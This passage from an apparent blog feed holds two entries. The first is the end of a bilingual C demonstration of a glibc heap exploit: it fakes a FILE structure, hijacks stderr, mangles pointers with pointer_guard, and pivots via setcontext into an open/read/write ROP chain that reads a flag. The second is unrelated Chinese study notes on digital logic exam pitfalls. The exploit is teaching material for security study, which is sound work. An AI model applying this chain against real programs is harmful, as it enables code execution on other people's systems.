class="string">&quot;\033[32m这个bss的地址应该被写入: \033[31m%p\n\033[0m&quot;</span>, bss_address);</span><br><span class="line">        *bss_address = (<span class="type">size_t</span>)(&amp;space);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe value of the pointer is: \033[31m%#zx\033[0m\n&quot;</span>, *bss_address);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m这个指针的值现在为: \033[31m%#zx\033[0m\n&quot;</span>, *bss_address);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span>* pcop = (<span class="type">size_t</span>*)((<span class="type">char</span>*)fake_file_struct + <span class="number">0xe8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of pcop should be written in: \033[31m%p\n\033[0m&quot;</span>, pcop);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mpcop的地址应该被写入到: \033[31m%p\n\033[0m&quot;</span>, pcop);</span><br><span class="line">        *pcop = (<span class="type">size_t</span>)(libc_base + <span class="number">0x1675b0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe value of the pointer is: \033[31m%#zx\033[0m\n&quot;</span>, *pcop);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m这个指针现在的值为: \033[31m%#zx\033[0m\n&quot;</span>, *pcop);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mDon&#x27;t forget we need to encrypt the pcop value.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m别忘了我们需要加密pcop的值。\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThen we need to let it xor with pointer_guard: \033[33m%#zx.\n\033[0m&quot;</span>, *pointer_guard_address);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m然后我们需要让pcop与pointer_guard异或: \033[33m%#zx.\n\033[0m&quot;</span>, *pointer_guard_address);</span><br><span class="line">        *pcop ^= *pointer_guard_address;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter xor, the value of [rdi+0xe8] is: \033[35m%#zx\n\033[0m&quot;</span>, *pcop);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m异或之后，[rdi+0xe8]的值为: \033[35m%#zx\n\033[0m&quot;</span>, *pcop);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen we need to let it rol 0x11 bits.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们让它循环左移0x11位。\033[0m&quot;</span>);</span><br><span class="line">        *pcop = (*pcop &lt;&lt; <span class="number">0x11</span>) + (*pcop &gt;&gt; <span class="number">0x2f</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter rol, the value of [rdi+0xe8] is: \033[35m%#zx\n\033[0m\n&quot;</span>, *pcop);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m循环左移之后，[rdi+0xe8]的值为: \033[35m%#zx\n\033[0m\n&quot;</span>, *pcop);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mNow, we are ready to write something in our bss segment.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m现在我们准备写一些内容到bss段。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mNoticing that the first instruction of pcop moves [rdi+0x8] to rdx, while rdi now is address of bss.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m注意到pcop的第一条指令将[rdi+0x8]的值移动到rdx，而rdi此时的值是bss处的地址。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mSo that we can write the address of somewhere in bss to [rdi+0x8](%p).\033[0m&quot;</span>, &amp;(space[<span class="number">1</span>]));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m所以我们可以将任意地址写到[rdi+0x8](%p)这个bss段中的地址。.\033[0m&quot;</span>, &amp;(space[<span class="number">1</span>]));</span><br><span class="line">        space[<span class="number">1</span>] = (<span class="type">size_t</span>)space;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m[rdi+0x8] now is: \033[31m%#zx\033[32m.\n\033[0m&quot;</span>, space[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m[rdi+0x8]现在的值为: \033[31m%#zx\033[32m.\n\033[0m&quot;</span>, space[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen we need to write address of setcontext into [rdx+0x20].\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们需要写setcontext函数的地址到[rdx+0x20]。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHave a look at disassembly result of function setcontext: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m看一下setcontext函数的汇编: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[34m.text:0000000000053A6D                 \033[1;31mmov     rsp, [rdx+0A0h]\033[34m\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A74                 mov     rbx, [rdx+80h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A7B                 mov     rbp, [rdx+78h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A7F                 mov     r12, [rdx+48h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A83                 mov     r13, [rdx+50h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A87                 mov     r14, [rdx+58h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A8B                 mov     r15, [rdx+60h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A8F                 test    dword ptr fs:48h, 2\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053A9B                 jz      loc_53B56\n&quot;</span></span><br><span class="line">             <span class="string">&quot;\t\t\t......\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B56                 \033[1;31mmov     rcx, [rdx+0A8h]\033[34m\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B5D                 \033[1;31mpush    rcx\033[34m\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B5E                 mov     rsi, [rdx+70h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B62                 mov     rdi, [rdx+68h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B66                 mov     rcx, [rdx+98h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B6D                 mov     r8, [rdx+28h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B71                 mov     r9, [rdx+30h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B75                 mov     rdx, [rdx+88h]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B75 ; &#125; // starts at 53A30\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B7C ; __unwind &#123;\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B7C                 xor     eax, eax\n&quot;</span></span><br><span class="line">             <span class="string">&quot;.text:0000000000053B7E                 retn\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWe let [rdx+0xa0] = bss + 0x100, and let [rdx+0xa8] = some gadget address as the start of our ROP chain.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们让[rdx+0xa0] = bss + 0x100, 让[rdx+0xa8] = 某些gadget的地址作为ROP链的开始。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThere are some useful gadgets: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里是一些有用的gadget地址: \033[0m&quot;</span>);</span><br><span class="line">        <span class="type">size_t</span> poprdi_ret = libc_base + <span class="number">0x2a3e5</span>;</span><br><span class="line">        <span class="type">size_t</span> poprsi_ret = libc_base + <span class="number">0x2be51</span>;</span><br><span class="line">        <span class="type">size_t</span> poprdx_rbx_ret = libc_base + <span class="number">0x90529</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mpop rdi ; ret : %#zx\n\033[0m&quot;</span>, poprdi_ret);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mpop rsi ; ret : %#zx\n\033[0m&quot;</span>, poprsi_ret);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mpop rdx ; pop rbx ; ret : %#zx\n\033[0m&quot;</span>, poprdx_rbx_ret);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHere are some key functions: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里是一些关键函数的地址: \033[0m&quot;</span>);</span><br><span class="line">        <span class="type">size_t</span> readfunc_addr = (<span class="type">size_t</span>)read;</span><br><span class="line">        <span class="type">size_t</span> writefunc_addr = (<span class="type">size_t</span>)write;</span><br><span class="line">        <span class="type">size_t</span> openfunc_addr = (<span class="type">size_t</span>)open;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mopen(): %#zx\n\033[0m&quot;</span>, openfunc_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mread(): %#zx\n\033[0m&quot;</span>, readfunc_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mwrite(): %#zx\n\033[0m&quot;</span>, writefunc_addr);</span><br><span class="line"></span><br><span class="line">        space[<span class="number">0x20</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)(libc_base + <span class="number">0x53a6d</span>);</span><br><span class="line">        space[<span class="number">0xa0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)(&amp;space[<span class="number">0x100</span> / <span class="number">8</span>]);</span><br><span class="line">        space[<span class="number">0xa8</span> / <span class="number">8</span>] = poprdi_ret;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen let&#x27;s construct our ROP chain.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们来构造ROP链。\033[0m&quot;</span>);</span><br><span class="line">        space[<span class="number">0x100</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)flag;</span><br><span class="line">        space[<span class="number">0x108</span> / <span class="number">8</span>] = poprsi_ret;</span><br><span class="line">        space[<span class="number">0x110</span> / <span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">        space[<span class="number">0x118</span> / <span class="number">8</span>] = openfunc_addr;</span><br><span class="line">        space[<span class="number">0x120</span> / <span class="number">8</span>] = poprdi_ret;</span><br><span class="line">        space[<span class="number">0x128</span> / <span class="number">8</span>] = <span class="number">3</span>;</span><br><span class="line">        space[<span class="number">0x130</span> / <span class="number">8</span>] = poprsi_ret;</span><br><span class="line">        space[<span class="number">0x138</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)(&amp;space[<span class="number">0xf0</span>]);</span><br><span class="line">        space[<span class="number">0x140</span> / <span class="number">8</span>] = poprdx_rbx_ret;</span><br><span class="line">        space[<span class="number">0x148</span> / <span class="number">8</span>] = <span class="number">0x40</span>;</span><br><span class="line">        space[<span class="number">0x150</span> / <span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">        space[<span class="number">0x158</span> / <span class="number">8</span>] = readfunc_addr;</span><br><span class="line">        space[<span class="number">0x160</span> / <span class="number">8</span>] = poprdi_ret;</span><br><span class="line">        space[<span class="number">0x168</span> / <span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line">        space[<span class="number">0x170</span> / <span class="number">8</span>] = poprsi_ret;</span><br><span class="line">        space[<span class="number">0x178</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)(&amp;space[<span class="number">0xf0</span>]);</span><br><span class="line">        space[<span class="number">0x180</span> / <span class="number">8</span>] = poprdx_rbx_ret;</span><br><span class="line">        space[<span class="number">0x188</span> / <span class="number">8</span>] = <span class="number">0x40</span>;</span><br><span class="line">        space[<span class="number">0x190</span> / <span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">        space[<span class="number">0x198</span> / <span class="number">8</span>] = writefunc_addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHere is the former part of bss spare space:\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m下面是bss空闲区域前面的一部分:\033[0m&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x20</span>; i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34m+%#5x\t\t%#18zx\t\t%#18zx\n\033[0m&quot;</span>, i * <span class="number">0x10</span>, space[<span class="number">2</span>*i], space[<span class="number">2</span>*i+<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31mError: invalid exploit mode!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m错误：选择了无效的利用模式！\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[032mThen, we need to \033[31mchange the size of top chunk to make it unaligned, and malloc a big space.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[032m然后，我们需要\033[31m修改top chunk的大小来让它不对齐，然后malloc一块大空间。\033[0m&quot;</span>);</span><br><span class="line">    *top_chunk_size = <span class="number">0x101</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe value of top_chunk-&gt;size was changed into: %#zx\033[0m\n&quot;</span>, *top_chunk_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m现在top_chunk-&gt;size的值被修改为: %#zx\033[0m\n&quot;</span>, *top_chunk_size);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen, change the value of stderr pointer.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后，修改stderr指针的值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mBefore alteration: *stderr_pointer = \033[33m%p\n\033[0m&quot;</span>, *((<span class="keyword">struct</span> _IO_FILE**)(stderr_ptr)));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改之前: *stderr_pointer = \033[33m%p\n\033[0m&quot;</span>, *((<span class="keyword">struct</span> _IO_FILE**)(stderr_ptr)));</span><br><span class="line">    *(<span class="type">size_t</span>*)stderr_ptr = (<span class="type">size_t</span>)fake_file_struct;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter alteration: *stderr_pointer = \033[31m%p\n\033[0m&quot;</span>, *((<span class="keyword">struct</span> _IO_FILE**)(stderr_ptr)));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改之后: *stderr_pointer = \033[31m%p\n\033[0m&quot;</span>, *((<span class="keyword">struct</span> _IO_FILE**)(stderr_ptr)));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAnd the last step: malloc(0x200) to trigger sysmalloc.\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m然后是最后一步：malloc(0x200)触发sysmalloc。\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数字逻辑 个人总结——考试易错点</title>
      <link href="/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93%E2%80%94%E2%80%94%E8%80%83%E8%AF%95%E6%98%93%E9%94%99%E7%82%B9/"/>
      <url>/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93%E2%80%94%E2%80%94%E8%80%83%E8%AF%95%E6%98%93%E9%94%99%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<ol><li>卡诺图中m&#x2F;M编号对应错误<br>在画卡诺图时，有时没有注意到行和列的变量顺序，可能会导致m&#x2F;M的序号从0遍历到15时，在卡诺图中的路径不同。如对于输入ABCD，将AB作为列，CD作为行，此时卡诺图中16块对应的m编号应如下表所示：</li></ol><table><thead><tr><th align="center">CD\AB</th><th align="center">00</th><th align="center">01</th><th align="center">11</th><th align="center">10</th></tr></thead><tbody><tr><td align="center">00</td><td align="center">m<del>0</del>($\overline {M_0}$)</td><td align="center">m<del>4</del>($\overline {M_4}$)</td><td align="center">m<del>12</del>($\overline {M_{12}}$)</td><td align="center">m<del>8</del>($\overline {M_8}$)</td></tr><tr><td align="center">01</td><td align="center">m<del>1</del></td><td align="center">m<del>5</del></td><td align="center">m<del>13</del></td><td align="center">m<del>9</del></td></tr><tr><td align="center">11</td><td align="center">m<del>3</del></td><td align="center">m<del>7</del></td><td align="center">m<del>15</del></td><td align="center">m<del>11</del></td></tr><tr><td align="center">10</td><td align="center">m<del>2</del></td><td align="center">m<del>6</del></td><td align="center">m<del>14</del></td><td align="center">m<del>10</del></td></tr></tbody></table><p>为了避免因遍历次序不同导致的错误，使遍历时统一按照大体上逐行读取的顺序（如下表），画卡诺图时应将前面2个变量置于行，后面2个变量至于列，左上角的块中应该写的是AB\CD。（不过如果卡诺图出在选项里面就不一定是这个顺序了，所以还是要注意）</p><table><thead><tr><th align="center">AB\CD</th><th align="center">00</th><th align="center">01</th><th align="center">11</th><th align="center">10</th></tr></thead><tbody><tr><td align="center">00</td><td align="center">m<del>0</del>($\overline {M_0}$)</td><td align="center">m<del>1</del>($\overline {M_1}$)</td><td align="center">m<del>3</del>($\overline {M_{3}}$)</td><td align="center">m<del>2</del>($\overline {M_2}$)</td></tr><tr><td align="center">01</td><td align="center">m<del>4</del></td><td align="center">m<del>5</del></td><td align="center">m<del>7</del></td><td align="center">m<del>6</del></td></tr><tr><td align="center">11</td><td align="center">m<del>12</del></td><td align="center">m<del>13</del></td><td align="center">m<del>15</del></td><td align="center">m<del>14</del></td></tr><tr><td align="center">10</td><td align="center">m<del>8</del></td><td align="center">m<del>9</del></td><td align="center">m<del>11</del></td><td align="center">m<del>10</del></td></tr></tbody></table><ol start="2"><li><p>8421码、2421码、余三码转2、8、10、16进制<br>三种码实际上均是10进制的表示形式，因此如果要转换为除10进制以外的形式，必须首先将其化为十进制数再进行进制转换，切忌转换后不化成十进制直接转换为其他进制。<br>如将余三码10001100转为2进制，1000还原为8421码是0101，1100还原为8421码是1001，2进制值不是01011001！十进制为59，故二进制应为111011。</p></li><li><p>使用卡诺图化简函数表达式<br>有时化简表达式很容易出现变量冗余的情况。为避免这种问题产生，在卡诺图中应首先标出1部分中所有的仅含1个变量的蕴含项，标完后写入表达式。如果此时还有没包含的“1”块，则继续寻找所有仅含2个变量的蕴含项，如此进行下去。在验证检查时，可以尝试反向检查，即画出“0”块的表达式，取反看看原运算结果是否正确。</p></li><li><p>各类触发器激励函数与约束方程<br>在考试前，针对各类触发器的激励函数与约束方程应该背熟，这是设计题的一个基础知识。虽然说通过推导也能推导出来，但耗费时间且不保证推导正确。<br><font color=red>基本R-S触发器：</font><br>与非门构建的R-S触发器：$Q^{n+1}&#x3D;\bar S+RQ$，约束方程：$R+S&#x3D;1$（RS不同看R）<br>或非门构建的R-S触发器：$Q^{n+1}&#x3D;S+\bar RQ$，约束方程：$RS&#x3D;0$（RS不同看S）<br>由于没有时钟信号的控制，其信号控制相当于是异步的<br><font color=red>钟控触发器：</font><br>R-S触发器：$Q^{n+1}&#x3D;S+\bar RQ$（RS不同看S）<br>D触发器：$Q^{n+1}&#x3D;D$（只看D）<br>J-K触发器：$Q^{n+1}&#x3D;J\bar Q+\bar KQ$（JK不同看J）<br>T触发器：$Q^{n+1}&#x3D;T\bar Q+\bar TQ$（只看T）<br>实际上上面的公式也有记忆的方法。<br>由于有时钟信号的控制，对于主从触发器，当且仅当时钟信号处于下降沿时才会触发触发器，读取输入并根据输入修改状态。<font color=red>但是阻塞D触发器是当且仅当时钟信号处于上升沿时才会触发触发器改变状态。</font>（分析与设计题中一般不会考虑空翻现象，因此在这两种题型中默认使用的都是主从触发器）</p></li><li><p>只有反码在计算减法时需要对结果的最低位进行调整。例如计算3-2，假设反码共4位，那么-2的反码应该是1101。0011+1101&#x3D;10000，结果显然不对，需要将溢出的1加到最低位变为0001。如果计算6-7，则应为0110+1000&#x3D;1110，此时结果正确，因为没有溢出。这也是反码加减法的计算方法：如果有溢出则将溢出的1加到最低位，没有则直接得到结果。原码的加减法直接计算更为复杂。<strong>反码和补码能将减法转换为加法，但是原码不行。</strong></p></li><li><p>同时有一个变量的正反形式的表达式不一定会存在险象，还是看卡诺图最为保险！<br>探究：如何仅通过卡诺图判断一个险象是“0”型还是“1”型险象、是什么变量产生险象?<br>回顾一下，“0”型险象是A+~A产生的，“1”型险象是A· ~A产生的，记忆很简单，A+ ~A本来应该是1，险象就说明有错误，那就是产生0嘛。注意：0险象仅产生于使用含与或表达式的函数表达式构建的电路中，1险象仅产生于使用含或与表达式的函数表达式构建的电路中。<strong>如果电路完全按照与或表达式构建，则只可能产生“0”险象；如果电路完全按照或与表达式构建，则只可能产生“1”险象。</strong><br>看个例子：$F&#x3D;A\overline BC+BCD$<br>卡诺图如下：<br><img src="https://img-blog.csdnimg.cn/c9d5a378ef214efeac314b555ae4f6a0.png"><br>显然这个例子中产生险象的是B，从图中何以见得？当ACD均为1时，相切处的两边正好就是B取0和1的值，均为1但会产生“0”险象。因此判断方法就是：<strong>看相切两边哪个变量的取值不一样，就是哪一个变量产生的险象。</strong><br>对于“1”险象，看书上例子：$(A+B)(\overline A+C)$：<br><img src="https://img-blog.csdnimg.cn/3f94a54ed28a435687389f4c8a7b5979.png"><br>相切处A变量不同，故A变量会产生“1”险象。<br>如果是混合的表达式：如$(A+B)(AC+\overline CD)+BC\overline D$这种，上面的方法虽然还能用，但容易错，因此建议使用传统方法，即配凑出原变量和反变量的和或积，反而更加方便。而且在要求设计电路的题目中并不会这样要求，要么是与或，要么是或与，由于设计题中需要画出卡诺图，因此通过上述方法无需进行配凑。出现混合表达式一般都是要求直接判断，画卡诺图反而费时间了。</p></li><li><p>主从J-K触发器<strong>有输入限制条件：</strong> 课本第89页指出在时钟信号作用期间J和K禁止发生变化，否则可能会产生错误信号输出（脉冲信号干扰产生的“一次翻转现象”），具体详见课本。</p></li><li><p>做含有触发器的题目时要注意时钟信号的输入有没有取反。所有的触发器在时钟信号为1时才会触发，因此如果直接将时钟信号输入触发器，则触发器应该是在时钟信号上升沿开始工作；而如果输入反变量，则应该是在下降沿开始工作。（分析题和设计题中一般不考虑一个时钟信号内有多个输入信号变化的情况，因此上升沿和下降沿一般被认为是输入信号作用的唯一时刻，所以要分清楚）</p></li><li><p>存在触发器并不是同步时序逻辑电路的必要条件，也不是充分条件（同步时序逻辑电路中的触发器必须要有钟控触发器，不能全是基本触发器）！</p></li><li><p>Moore型电路和Mealy型电路关于输出的区别在于：当时钟信号为无效时，Moore型电路由于输出不受输入的影响，可以保持当前状态的稳定输出；而Mealy型电路则可能会由于这段时间输入的变化而导致输出产生变化，不过这个时间段的触发器状态绝对不会改变。当时钟信号为有效时，Moore型电路的输入能够直接改变触发器的状态，在一个有效的时钟周期之内这种状态改变可能会多次产生（不考虑主从触发器），Mealy型电路也是如此。</p></li><li><p>芯片编号与功能汇总：<br>74283：4位并行加法器<br>74138：3-8线译码器<br>7442：二-十进制译码器<br>7448：七段显示译码器（用于数码管显示数字）<br>74147：十进制-BCD码编码器<br>74148：优先编码器（8-3线）<br>74153：多路选择器MUX（双4路）<br>74152、74151：多路选择器（8路，74152无使能端）<br>74150：多路选择器（16路）<br>74193：4位二进制同步可逆计数器<br>74290：异步计数器（二-五-十进制加法计数器）<br>74194：集成4位双向移位寄存器</p></li><li><p>画时间图时务必需要注意：<br>(1) 是否是边沿触发器（一般CLK输入以△注明，如果给出了触发器内部的电路图，发现是普通钟控触发器，就需要考虑空翻现象）<br>(2) 上升沿触发还是下降沿触发（如果输入有圆圈，即取反操作，则为下降沿触发，直接输入则为上升沿触发）<br>(3) 如果明确为主从触发器，对于JK主从触发器需要考虑是否存在一次空翻现象，因此需要将JK主从触发器的主和从触发器的状态均画出<br>(4) 垂直的虚线一定要画，但不要画的太重太粗以影响审题</p></li><li><p>各种图表<br>在时序逻辑和组合逻辑电路的分析和设计中经常需要画图画表，各种表的名字很像，稍有不慎就会画成另外一种表，需要格外注意分清。<br><strong>真值表</strong>：在组合逻辑电路中指列出所有输入情况与对应的输出的表格，包含表项有：所有输入与所有输出<br><strong>原始状态表</strong>：同步时序逻辑电路设计中根据功能需要而列出的状态表，没有进行状态化简，所有状态均以字母表示。<br><strong>最小化状态表</strong>：同步时序逻辑电路设计中由原始状态表化简得来的状态表，含实现特定功能电路所需的最少状态与转换关系。<br><strong>状态表</strong>：在时序逻辑电路中指列出所有不同现态、不同输入与对应的输出的表格，包含表项有：所有触发器状态变量对应的现态（分析时由于电路已知，现态使用二进制码表示，设计时需要用字母表示）、所有输入情况x（设输入变量个数为n，在同步时序逻辑电路中，输入情况的种类数量应为2^n^，在异步时序逻辑电路中，输入情况的种类数应为n，因为异步时序不允许同时两个变量输入）、次态与输出（Moore型次态和输出分别列出，Mealy型次态和输出一起列出）<br><strong>隐含表</strong>：同步时序逻辑电路设计中为化简原始状态表而画出的三角形表格，左边一列应该从第二个状态写到最后一个状态，下边一行应该从第一个状态写到倒数第二个状态。<br><strong>次态真值表</strong>：在时序逻辑电路中指列出所有输入与现态对应的激励函数与次态的表格，包含表项有：输入与现态的所有组合形式、所有激励函数、次态。在异步时序逻辑电路中激励函数不止包含JK&#x2F;RS&#x2F;D&#x2F;T，还包含时钟信号，↓表示下降沿信号，↑表示上升沿信号。<br><strong>激励函数与输出函数真值表</strong>：在时序逻辑电路中指列出所有输入与现态对应的激励函数与输出的表格，包含表项有：输入与现态的所有组合形式、所有激励函数、所有输出函数。此表有时也会将次态与状态跳变（见于异步时序）列出，这样能够反映出该同步时序逻辑电路的所有状态的所有情况。<br><strong>激励表</strong>：反映某种触发器从现态到次态转换与输入的关系，包含表项有：所有现态与次态的组合形式（共4种，0→0,0→1,1→0,1→1），对应的输入值（JK&#x2F;RS&#x2F;T&#x2F;D），特定触发器的激励表固定不变。在异步时序逻辑电路中，激励表还应加上时钟端信号。<br><strong>功能表</strong>：反映某种触发器所有输入对应的次态，包含表项有：所有输入的组合形式、对应的次态。与激励表不同的是，功能表反映当输入为多少时次态会变成什么，而激励表反映触发器从某种现态转换到某种次态时可能的输入有哪些。</p></li><li><p>各种函数表达式<br><strong>输出函数表达式</strong>：描述输出的函数表达式。自变量：现态、输入；因变量：输出<br><strong>激励函数表达式（又称驱动函数表达式、驱动方程表达式）</strong>：描述存储电路输入与电路输入和状态之间的关系。自变量：输入、现态；因变量：存储电路输入（JK&#x2F;RS&#x2F;T&#x2F;D）<br><strong>次态函数表达式</strong>：描述次态与激励函数和现态的关系。自变量：现态、激励函数；因变量：次态<br><strong>状态方程表达式（又称次态方程表达式）</strong>：描述次态与现态、输入之间的关系。自变量：现态、输入；因变量：次态（通常由次态函数表达式转化而来）</p></li><li><p>阵列逻辑图<br>使用不同的PLD画阵列逻辑图需要注意固定的画点，可编程的画叉，不要画错了。PROM与阵列固定或阵列可变；PLA与阵列或阵列均可变；PAL、GAL与阵列可变或阵列固定</p></li><li><p>常见的电路功能：<br>模n计数（多为普通二进制码，也做过用格雷码计数的）、序列检测器（标志：有很多指向一个状态的情况）、序列发生器、n位全加器、n位全减器、n位比较器、不同码的转换等。如果通过状态表一时间看不出来是什么功能，可以尝试在输入固定的情况下追踪状态，状态图如果过于复杂也可以先画在草稿纸上，排布一下状态的位置，以让图更美观。</p></li><li><p>状态编码<br>3条状态编码的优先规则一定要理解。<br>第一条相同输入、相同次态→现态相邻（看状态表次态中某一列中是否有相等的）<br>第二条相同现态，相邻输入→次态相邻（看状态表中某一行所有相邻的两个次态<font 